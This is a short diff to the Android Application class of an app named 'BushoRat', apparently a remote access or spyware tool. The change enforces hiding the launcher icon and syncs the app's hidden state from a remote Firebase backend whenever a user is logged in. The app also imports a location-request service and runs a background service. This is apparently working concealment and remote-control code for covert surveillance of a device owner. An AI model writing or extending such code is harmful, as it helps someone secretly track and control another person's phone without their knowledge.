@@ -8,7 +8,7 @@ import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.FirebaseDatabase;
 import com.bushorat.app.helpers.AppVisibilityHelper;
-import com.bushorat.app.helpers.UserDataSyncHelper;
+import com.bushorat.app.helpers.SessionManager;
 import com.bushorat.app.services.BackgroundMaintenanceService;
 import com.bushorat.app.services.LocationRequestService;
 
@@ -29,18 +29,17 @@ public class BushoRatApplication extends Application {
         AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
         boolean isHidden = visibilityHelper.isAppHidden();
         Log.d(TAG, "App visibility on startup: hidden=" + isHidden);
-        
+
         if (isHidden) {
-            // App was hidden before — keep launcher icon hidden
-            visibilityHelper.setMainLauncherEnabled(false);
-            Log.d(TAG, "App is hidden, hiding launcher icon");
-        } else {
-            // App is visible — ensure launcher icon is shown
-            visibilityHelper.ensureLauncherComponentEnabled();
-            Log.d(TAG, "App is visible, showing launcher icon");
+            visibilityHelper.enforceHiddenLauncher();
         }
-        
-        // Start background maintenance service
+
+        SessionManager sessionManager = new SessionManager(this);
+        if (FirebaseAuth.getInstance().getCurrentUser() != null || sessionManager.isUserLoggedIn()) {
+            visibilityHelper.ensureListenerStarted();
+            visibilityHelper.syncVisibilityFromFirebaseBlocking();
+        }
+
         startBackgroundService();
         registerVisibilityAuthListener();
     }
